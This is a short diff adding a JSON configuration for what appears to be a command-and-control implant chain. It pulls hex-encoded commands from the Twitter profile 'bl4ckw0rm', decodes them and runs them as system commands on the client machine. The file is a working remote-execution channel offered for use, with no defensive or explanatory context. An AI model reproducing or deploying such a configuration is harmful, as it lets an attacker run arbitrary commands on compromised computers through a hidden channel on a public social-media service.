@@ -1,0 +1,31 @@
+[
+    {
+        "type": "Transportation", 
+        "module": "Twitter", 
+        "chain": "CLIENT", 
+        "settings": {
+            "function": "f_grab_cmd_from_twitter_profile",
+            "args": {
+                "profile_name": "bl4ckw0rm"
+            }
+        }
+    },
+    {
+        "settings": {
+            "function": "f_hex_to_ascii",
+            "args": null
+        },
+        "type": "Transformation",
+        "chain": "CLIENT",
+        "module": "Crypto"
+    },
+    {
+        "settings": {
+            "function": "f_exec_system",
+            "args": null
+        },
+        "type": "Post",
+        "chain": "CLIENT",
+        "module": "Command"
+    }
+]
